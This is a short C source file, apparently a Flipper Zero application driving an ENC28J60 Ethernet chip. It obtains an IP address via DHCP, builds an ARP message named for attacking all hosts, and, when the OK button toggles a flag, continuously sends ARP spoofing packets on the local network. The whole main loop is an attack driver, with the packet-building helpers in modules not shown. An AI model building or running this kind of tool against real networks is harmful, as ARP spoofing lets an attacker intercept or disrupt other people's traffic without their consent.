#include "app_user.h"
#include "modules/dhcp_protocol.h"
#include "modules/arp_module.h"

#define DEBUG_FILE true

// Instance for the ENC28j60
enc28j60_t* enc = NULL;

// MAC Address
uint8_t MAC[6] = {0xba, 0x3f, 0x91, 0xc2, 0x7e, 0x5d}; // BA:3F:91:C2:7E:5D

// The ip for the client and the server
uint8_t my_ip[4] = {192, 168, 0, 185};
uint8_t router_ip[4] = {192, 168, 0, 1};

// Just to help to see the IP
void show_ip(uint8_t* data) {
    for(uint8_t i = 0; i < 4; i++) {
        printf("%u:", data[i]);
    }
    printf("\n");
}

/**
 * Function to get the connection
 */
bool connection() {
    uint32_t prev_time = furi_get_tick();

    while(!process_dora(enc, my_ip, router_ip)) {
        if(furi_get_tick() > (prev_time + 5000)) return false;
    }

#if DEBUG_FILE
    printf("MY IP: \n");
    show_ip(my_ip);
    printf("ROUTER IP: \n");
    show_ip(router_ip);
#endif

    return true;
}

int app_main(void* p) {
    UNUSED(p);

    uint8_t buffer[1500] = {0};

    uint16_t lenght = 0;

    UNUSED(buffer);

    UNUSED(lenght);

    bool start = false;

    enc = enc28j60_alloc(MAC);
    if(enc28j60_start(enc) != 0xff) {
#if DEBUG_FILE
        printf("Chip conectado\n");
#endif

        start = connection();
    }

    set_arp_message_for_attack_all(buffer, MAC, router_ip, &lenght);

    bool attack = false;

    while(furi_hal_gpio_read(&gpio_button_back) && start) {
        if(furi_hal_gpio_read(&gpio_button_ok)) {
            // if(process_dora(enc, my_ip, router_ip)) {
            //     FURI_LOG_I("FLIPPER", "ALL OKAY");
            //     show_ip(my_ip);
            //     show_ip(router_ip);
            // } else {
            //     FURI_LOG_E("FLIPPER", "NOTHING");
            // }

            // send_packet(enc, buffer, lenght);

            attack = !attack;

            furi_delay_ms(200);
        }

        if(attack && is_link_up(enc)) send_arp_spoofing(enc, buffer, lenght);

        furi_delay_ms(1);
    }

    enc28j60_deinit(enc);
    free_enc28j60(enc);

    return 0;
}
